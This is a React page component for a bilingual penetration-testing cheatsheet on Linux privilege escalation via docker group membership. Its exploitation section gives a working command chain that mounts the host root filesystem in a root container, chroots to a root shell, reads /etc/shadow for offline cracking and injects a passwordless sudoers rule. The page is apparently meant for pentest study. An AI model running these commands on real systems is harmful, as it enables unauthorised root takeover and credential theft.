"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function DockerPrivescPage() {
  const { lang } = useLanguage();

  const sections = [
    {
      id: "enum",
      title: lang === "fr" ? "Enumération" : "Enumeration",
      entries: [
        {
          cmd: "id",
          why: lang === "fr"
            ? "Vérifier si docker est dans les groupes actifs de la session."
            : "Check if docker is in the active groups of the current session.",
        },
        {
          cmd: "groups",
          why: lang === "fr"
            ? "Liste des groupes de l'utilisateur, chercher docker dedans."
            : "List user groups, look for docker in there.",
        },
        {
          cmd: "newgrp docker",
          why: lang === "fr"
            ? "Activer le groupe docker dans la session courante sans se reconnecter."
            : "Activate the docker group in the current session without reconnecting.",
        },
        {
          cmd: "docker ps",
          why: lang === "fr"
            ? "Vérifier que docker est fonctionnel et lister les containers en cours."
            : "Verify docker works and list running containers.",
        },
        {
          cmd: "docker images",
          why: lang === "fr"
            ? "Lister les images disponibles localement pour réutiliser une existante."
            : "List locally available images to reuse an existing one.",
        },
      ],
    },
    {
      id: "exploit",
      title: lang === "fr" ? "Exploitation" : "Exploitation",
      entries: [
        {
          cmd: "docker run --rm -it -u 0 --entrypoint sh -v /:/mnt $IMAGE",
          why: lang === "fr"
            ? "Lancer un container en root (-u 0) avec le FS host monté sous /mnt. Remplacer $IMAGE par une image déjà présente sur la machine."
            : "Launch a container as root (-u 0) with the host FS mounted at /mnt. Replace $IMAGE with an image already present on the machine.",
        },
        {
          cmd: "chroot /mnt sh",
          why: lang === "fr"
            ? "Depuis l'intérieur du container, chroot vers le FS host pour obtenir un shell root réel."
            : "From inside the container, chroot into the host FS to get a real root shell.",
        },
        {
          cmd: "cp /mnt/etc/shadow /tmp/shadow && cat /tmp/shadow",
          why: lang === "fr"
            ? "Exfiltrer /etc/shadow via le montage pour cracker les hashes offline."
            : "Exfiltrate /etc/shadow via the mount to crack hashes offline.",
        },
        {
          cmd: "echo '$USER ALL=(ALL) NOPASSWD:ALL' >> /mnt/etc/sudoers",
          why: lang === "fr"
            ? "Injecter une règle sudoers pour obtenir sudo sans mot de passe sur l'hôte."
            : "Inject a sudoers rule to get passwordless sudo on the host.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Privesc Linux</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
          Docker Privesc
        </h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Utilisateur dans le groupe docker : monter / dans un container root, chroot, game over."
            : "User in the docker group: mount / in a root container, chroot, game over."}
        </p>
      </header>

      {sections.map((section) => (
        <section key={section.id} id={section.id} className="mb-10">
          <h2 className="mb-4 font-mono text-xs uppercase tracking-widest text-primary">
            {section.title}
          </h2>
          <div className="space-y-4">
            {section.entries.map((entry) => (
              <CheatsheetCommandCard key={entry.cmd} cmd={entry.cmd} why={entry.why} lang={lang} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}
